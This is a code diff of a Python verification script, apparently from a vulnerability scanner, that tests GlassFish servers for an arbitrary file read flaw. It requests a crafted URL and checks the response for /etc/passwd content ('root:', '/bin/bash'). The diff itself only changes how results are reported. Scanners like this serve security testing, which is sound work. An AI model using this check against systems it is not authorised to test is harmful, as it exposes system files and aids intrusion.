@@ -8,8 +8,6 @@ description: java 语音中会把 "%c0%ae" 解析为 "\uC0AE" ，最后转义为
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
 
 class glassfish_fileread_BaseVerify:
     def __init__(self, url):
@@ -24,12 +22,14 @@ class glassfish_fileread_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"/bin/bash" in req.text and r"root:" in req.text:
-                cprint("[+]存在glassfish 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在glassfish 任意文件读取漏洞...(高危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ======>连接超时"
+
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = glassfish_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
